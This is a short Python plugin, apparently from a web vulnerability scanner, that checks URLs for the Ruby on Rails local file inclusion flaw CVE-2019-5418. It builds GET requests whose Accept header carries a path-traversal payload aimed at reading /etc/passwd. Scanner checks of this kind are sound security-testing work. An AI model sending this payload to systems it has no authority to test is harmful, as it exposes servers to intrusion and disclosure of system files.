#This module scans for the ruby on rails LFI - CVE-2019-5418
from yapsy.IPlugin import IPlugin
from lib.requestObject import RequestObject

class RailsLFI(IPlugin):
    def gen(self, cwd, urls, proxy, headers, timeout, cookies,
            postdata, module, datalist):
        requestList = []
        
        for url in urls:
                new_h = headers.copy()
                new_h['Accept'] = '../../../../../../../../etc/passwd{{'
                req_get = RequestObject('reqID', "GET", proxy, new_h, timeout, 
                                        cookies, url, postdata, module)
                requestList.append(req_get)
        return requestList
